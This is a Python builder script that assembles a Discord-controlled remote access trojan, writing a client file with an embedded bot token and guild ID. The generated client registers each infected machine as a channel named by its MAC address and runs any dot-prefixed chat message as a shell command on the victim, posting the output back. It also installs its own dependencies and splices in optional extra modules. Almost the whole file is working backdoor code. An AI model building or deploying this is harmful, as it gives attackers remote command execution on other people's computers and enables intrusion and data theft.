import json
import os
import sys
import importlib.util
from datetime import datetime
import subprocess
import re

# --- Setup output and settings paths ---
date_str = datetime.now().strftime("%Y_%m_%d")
script_dir = os.path.dirname(__file__)
output_dir = os.path.join(script_dir, '..', '..', '..', 'OUTPUT')
os.makedirs(output_dir, exist_ok=True)
client_script_path = os.path.join(output_dir, date_str+'_client.py')
settings_path = os.path.join(script_dir, '..', '..', 'settings', 'settings.json')

print(f"[?] Settings path: {settings_path}")
print(f"[?] Client path: {client_script_path}")

if not os.path.exists(settings_path):
    print(f"[-] Settings file not found at {settings_path}")
    sys.exit(1)

# --- Load settings from JSON ---
print(f"[?] Reading settings from {settings_path}")
try:
    with open(settings_path, "r") as file:
        settings = json.load(file)
except json.JSONDecodeError as error:
    print(f"[-] Error parsing JSON: {error}")
    sys.exit(1)
print(f"[+] Reading settings from {settings_path} successfully")

# --- Prepare the initial client script ---
initial_script = """
import os
import sys
import subprocess
import re
import uuid
invalid_modules = {"__(module_name)", '"', "'", '",', '__(module)'}

def installModuleIfMissing(module_name):
    try:
        __import__(module_name)
        print(f"[OK] {module_name} is already installed")
    except ImportError:
        print(f"[MISSING] {module_name} is missing, installing...")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", module_name])
            print(f"[OK] {module_name} has been installed")
        except subprocess.CalledProcessError:
            print(f"[ERROR] Installation of {module_name} failed")

# Gather modules from the current file
required_modules = []
with open(__file__, "r") as f:
    for line in f:
        if "import" in line and not line.strip().startswith("#"):
            # A simplistic extraction of the module name after the keyword 'import'
            parts = line.split("import", 1)
            if len(parts) < 2:
                continue
            module_candidate = parts[1].strip().split()[0]
            # Skip if the candidate is in our invalid tokens list or doesn't match our valid module pattern
            if module_candidate in invalid_modules:
                continue
            required_modules.append(module_candidate)
            print("[+] Checking module: " + module_candidate)
            installModuleIfMissing(module_candidate)

# Now check that all required modules are available.
missing_modules = []
for module in required_modules:
    try:
        __import__(module)
    except ImportError:
        missing_modules.append(module)

if missing_modules:
    print("The following modules are still missing:", missing_modules)
    os.system(f"{sys.executable} {__file__}")
    os.kill(os.getpid(), 9)
else:
    print("All modules installed successfully.")
"""
discord_code = """
import discord
# Initialize global variables
intents = discord.Intents.all()
intents.members = True
client = discord.Client(intents=intents)
mac_address = ''.join(('%012x' % uuid.getnode())[i:i+2] for i in range(0, 12, 2))
sessions = {}

class UserSession:
    def __init__(self):
        self.cwd = os.getcwd()

async def find_channel_by_name(guild, channel_name):
    for channel in guild.channels:
        if channel.name == channel_name:
            return channel
    return None

@client.event
async def on_ready():
    guild = client.get_guild(int(guildid))
    channel = await find_channel_by_name(guild, mac_address)
    if channel:
        await channel.send("Connection reestablished")
    else:
        channel = await guild.create_text_channel(mac_address)
        await channel.send("New Connection established")

@client.event
async def on_message(message):
    if message.author == client.user:
        return    
    if message.content.startswith('.'):
        # Get or create a session for this user
        user_id = message.author.id
        if user_id not in sessions:
            sessions[user_id] = UserSession()
        
        session = sessions[user_id]
        command = message.content[1:].strip()  # Remove the dot prefix and whitespace
        
        # Special handling for cd command
        if command.startswith('cd ') or command == 'cd':
            try:
                if command == 'cd':  # Just 'cd' goes to home directory
                    new_dir = os.path.expanduser("~")
                else:
                    # Extract the target directory
                    target_dir = command[3:].strip()
                    # Handle relative or absolute paths
                    if os.path.isabs(target_dir):
                        new_dir = target_dir
                    else:
                        new_dir = os.path.join(session.cwd, target_dir)
                
                # Try to change directory
                if os.path.exists(new_dir) and os.path.isdir(new_dir):
                    session.cwd = os.path.abspath(new_dir)
                    output = f"Changed directory to: {session.cwd}"
                    dir_contents = os.listdir(session.cwd)
                    dir_listing = "\\n".join(dir_contents) if dir_contents else "Directory is empty"
                    output += f"\\n\\nDirectory contents:\\n{dir_listing}"
                else:
                    output = f"Error: Directory '{new_dir}' does not exist"
                
                embed = discord.Embed(
                    title="Directory Change",
                    description=f"```{output}```",
                    color=0xfafafa
                )
                await message.reply(embed=embed)
            except Exception as e:
                error_embed = discord.Embed(
                    title="Error",
                    description=f"```{str(e)}```",
                    color=0xff0000
                )
                await message.reply(embed=error_embed)
        else:
            try:
                process = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    cwd=session.cwd
                )
                stdout, stderr = process.communicate()                
                output = stdout if stdout else stderr
                if not output:
                    output = "Command executed successfully with no output"
                
                if len(output) > 4000:  # Using 4000 to be safe
                    temp_file = f"output_{message.id}.txt"
                    with open(temp_file, 'w', encoding='utf-8') as f:
                        f.write(output)
                    
                    await message.reply(
                        content="Output too large for embed. Sending as file:",
                        file=discord.File(temp_file, filename=f"{command.replace(' ', '_')}_output.txt")
                    )
                    
                    try:
                        os.remove(temp_file)
                    except:
                        pass
                else:
                    embed = discord.Embed(
                        title=f"Command: {command} (in {session.cwd})",
                        description=f"```{output}```",
                        color=0xfafafa
                    )
                    embed.add_field(name="Exit Code", value=str(process.returncode))
                    await message.reply(embed=embed)
            except Exception as e:
                error_embed = discord.Embed(
                    title="Error",
                    description=f"```{str(e)}```",
                    color=0xff0000
                )
                await message.reply(embed=error_embed)
    elif message.content.lower() == "exit":
        await message.channel.send("```diff\\n+ Exiting...\\n```")
        os.kill(os.getpid(), 9)

"""

# --- Process additional component modules (if any) ---
components_dir = os.path.join(script_dir, 'components', 'done')
print(f"[?] Searching for components in {components_dir}")

modules_config = settings.get("Modules", settings.get("modules", {}))
if modules_config:
    print(f"[i] Found modules in settings: {', '.join(modules_config.keys())}")
else:
    print("[i] No modules configuration found in settings")

modules_code = ""
for module_name, is_enabled in modules_config.items():
    if not is_enabled:
        print(f"[?] Module {module_name} is disabled in settings; skipping.")
        continue
    module_file_name = f"{module_name.lower()}.py"
    module_file_path = os.path.join(components_dir, module_file_name)
    if not os.path.exists(module_file_path):
        print(f"[-] Module {module_name} is enabled in settings but file not found at {module_file_path}")
        continue
    try:
        spec = importlib.util.spec_from_file_location(module_name, module_file_path)
        module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(module)
        if hasattr(module, "get_code"):
            print(f"[+] Adding code from {module_name}")
            modules_code += module.get_code()
        if hasattr(module, "get_dependencies"):
            print(f"[+] Adding dependencies from {module_name}")
            initial_script += module.get_dependencies() 
        else:
            print(f"[-] Module {module_name} does not have a get_code function")
    except Exception as error:
        print(f"[-] Error loading {module_name} from {module_file_path}: {error}")

# --- Finalize the client script ---
bot_token = settings.get("token", "")
guild_id = settings.get("guildID", "")
step1 = f"""# Bot configuration
guildid = "{guild_id}"
bottoken = "{bot_token}"
"""
step3 = """
# Start the bot
client.run(bottoken)
"""
final_script = step1 + initial_script + discord_code + modules_code + step3

# --- Write the client script to file ---
with open(client_script_path, "w") as file:
    file.write(final_script)
print("[+] Writing client.py successful")
print(f"[+] client.py has been generated at {client_script_path}")
